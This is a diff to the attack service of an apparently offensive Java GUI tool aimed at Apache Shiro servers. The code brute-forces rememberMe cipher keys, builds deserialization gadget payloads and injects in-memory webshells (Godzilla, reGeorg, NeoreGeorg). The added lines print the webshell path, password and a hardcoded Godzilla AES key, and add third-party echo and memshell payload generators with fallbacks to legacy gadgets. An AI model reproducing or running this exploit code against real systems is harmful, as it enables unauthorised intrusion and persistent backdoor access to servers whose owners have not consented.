@@ -10,6 +10,11 @@ import com.summersec.attack.deser.plugins.keytest.KeyEcho;
 import com.summersec.attack.deser.util.Gadgets;
 import com.summersec.attack.entity.ControllersFactory;
 import com.summersec.attack.UI.MainController;
+import com.summersec.attack.integration.generator.GeneratorFacade;
+import com.summersec.attack.integration.generator.model.EchoGenerateRequest;
+import com.summersec.attack.integration.generator.model.EchoGenerateResult;
+import com.summersec.attack.integration.generator.model.MemshellGenerateRequest;
+import com.summersec.attack.integration.generator.model.MemshellGenerateResult;
 import com.summersec.attack.utils.HttpUtil;
 import com.summersec.attack.utils.Utils;
 import java.io.BufferedReader;
@@ -25,6 +30,7 @@ import java.util.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import javafx.application.Platform;
 import javafx.collections.ObservableList;
 import org.apache.commons.lang.StringUtils;
 import org.apache.shiro.codec.Base64;
@@ -44,6 +50,7 @@ public class AttackService {
     public static Map<String, String> globalHeader = null;
     public static String postData = null;
     private final MainController mainController;
+    private final GeneratorFacade generatorFacade = new GeneratorFacade();
     public int flagCount = 0;
 
     public AttackService(String method, String url, String shiroKeyWord, String timeout, Map<String, String> globalHeader, String postData) {
@@ -59,19 +66,19 @@ public class AttackService {
 
     public HashMap<String, String> getCombineHeaders(HashMap<String, String> header) {
         HashMap<String, String> combineHeaders = new HashMap();
+        combineHeaders.putAll(header);
         Set<String> keySet = globalHeader.keySet();
-        if (keySet.size() != 0) {
-            for (String key : keySet) {
-                if (key.equals("Cookie")) {
-                    header.replace("Cookie", globalHeader.get(key) + "; " + header.get(key));
-                    combineHeaders.putAll(header);
+        for (String key : keySet) {
+            if (key.equals("Cookie")) {
+                String existing = combineHeaders.get("Cookie");
+                if (existing != null && !existing.isEmpty()) {
+                    combineHeaders.put("Cookie", globalHeader.get(key) + "; " + existing);
                 } else {
-                    combineHeaders.putAll(header);
-                    combineHeaders.put(key, globalHeader.get(key));
+                    combineHeaders.put("Cookie", globalHeader.get(key));
                 }
+            } else {
+                combineHeaders.put(key, globalHeader.get(key));
             }
-        } else {
-            combineHeaders = header;
         }
         return combineHeaders;
     }
@@ -90,11 +97,8 @@ public class AttackService {
                 result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
 
             } else {
-//                result = HttpUtil.postHeaderByHttpRequest(this.url, "UTF-8", this.postData, combineHeaders, this.timeout);
-//                result = bodyHttpRequest(combineHeaders, this.postData);
-                result = HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
-                System.out.println(result);
-
+                String contentType = combineHeaders.containsKey("Content-Type") ? combineHeaders.get("Content-Type") : "application/x-www-form-urlencoded";
+                result = HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, contentType, this.timeout);
             }
         } catch (Exception var5) {
             this.mainController.logTextArea.appendText(Utils.log(var5.getMessage()));
@@ -338,19 +342,25 @@ public class AttackService {
                             String result = AttackService.this.headerHttpRequest(header);
                             Thread.sleep(100L);
                             if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
-                                AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
-                                AttackService.this.mainController.shiroKey.setText(shirokey);
+                                final String foundKey = shirokey;
+                                Platform.runLater(() -> {
+                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
+                                    AttackService.this.mainController.shiroKey.setText(foundKey);
+                                });
                                 AttackService.realShiroKey = shirokey;
                                 break;
                             }
 
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey));
+                            final String failKey1 = shirokey;
+                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
                         } catch (Exception var6) {
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
+                            final String failKey2 = shirokey;
+                            final String errMsg1 = var6.getMessage();
+                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey2 + " " + errMsg1)));
                         }
 
                     }
-                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束"));
+                    Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));
 
                 } catch (Exception var7) {
                     throw var7;
@@ -374,19 +384,25 @@ public class AttackService {
                             String result = AttackService.this.headerHttpRequest(header);
                             Thread.sleep(100L);
                             if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
-                                AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
-                                AttackService.this.mainController.shiroKey.setText(shirokey);
+                                final String foundKey = shirokey;
+                                Platform.runLater(() -> {
+                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
+                                    AttackService.this.mainController.shiroKey.setText(foundKey);
+                                });
                                 AttackService.realShiroKey = shirokey;
                                 break;
                             }
 
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey));
+                            final String failKey1 = shirokey;
+                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
                         } catch (Exception var6) {
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
+                            final String failKey2 = shirokey;
+                            final String errMsg2 = var6.getMessage();
+                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey2 + " " + errMsg2)));
                         }
 
                     }
-                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束"));
+                    Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));
 
                 } catch (Exception var7) {
                     throw var7;
@@ -434,8 +450,15 @@ public class AttackService {
                     String httpAddress = Utils.UrlToDomain(this.url);
                     this.mainController.InjOutputArea.appendText(Utils.log(memShellType + "  注入成功!"));
                     this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
-                    if (!memShellType.equals("reGeorg[Servlet]")) {
+                    if (memShellType.contains("哥斯拉")) {
                         this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
+                        this.mainController.InjOutputArea.appendText(Utils.log("密钥(Key)：3c6e0b8a9c15224a"));
+                        this.mainController.InjOutputArea.appendText(Utils.log("加密方式：AES"));
+                    } else if (!memShellType.equals("reGeorg[Servlet]") && !memShellType.equals("reGeorg[Filter]")) {
+                        this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
+                    }
+                    if (memShellType.contains("NeoreGeorg")) {
+                        this.mainController.InjOutputArea.appendText(Utils.log("[!] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
                     }
                 } else {
                     if (result.contains("->|") && result.contains("|<-")) {
@@ -451,6 +474,57 @@ public class AttackService {
             this.mainController.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
         }
 
+    }
+
+    public EchoGenerateResult generateEchoWithThirdParty(String source, String serverType, String modelType, String formatType,
+                                                         String legacyGadget, String legacyEcho, String shiroKey) {
+        try {
+            if ("Legacy".equalsIgnoreCase(source)) {
+                String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
+                if (rememberMe == null || rememberMe.isEmpty()) {
+                    return EchoGenerateResult.fail("Legacy", "Legacy 回显构造失败");
+                }
+                return EchoGenerateResult.ok("Legacy", rememberMe, "Cookie");
+            }
+
+            EchoGenerateRequest request = new EchoGenerateRequest();
+            request.setServerType(serverType);
+            request.setModelType(modelType);
+            request.setFormatType(formatType);
+            EchoGenerateResult result = generatorFacade.generateEcho(source, request);
+            if (!result.isSuccess()) {
+                String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
+                if (rememberMe != null && !rememberMe.isEmpty()) {
+                    this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Echo 生成失败，已自动回退 Legacy"));
+                    return EchoGenerateResult.ok("Legacy", rememberMe, "Cookie");
+                }
+            }
+            return result;
+        } catch (Exception e) {
+            return EchoGenerateResult.fail(source, e.getMessage());
+        }
+    }
+
+    public MemshellGenerateResult generateMemshellWithThirdParty(String source, String toolType, String serverType,
+                                                                 String shellType, String formatType,
+                                                                 String gadgetType, String legacyMemshellOption) {
+        try {
+            MemshellGenerateRequest request = new MemshellGenerateRequest();
+            request.setToolType(toolType);
+            request.setServerType(serverType);
+            request.setShellType(shellType);
+            request.setFormatType(formatType);
+            request.setGadgetType(gadgetType);
+            request.setOption(legacyMemshellOption);
+            MemshellGenerateResult result = generatorFacade.generateMemshell(source, request);
+            if (!result.isSuccess() && !"Legacy".equalsIgnoreCase(source)) {
+                this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 生成失败，已自动回退 Legacy"));
+                return generatorFacade.generateMemshell("Legacy", request);
+            }
+            return result;
+        } catch (Exception e) {
+            return MemshellGenerateResult.fail(source, e.getMessage());
+        }
     }
 
     public static void main(String[] args) {
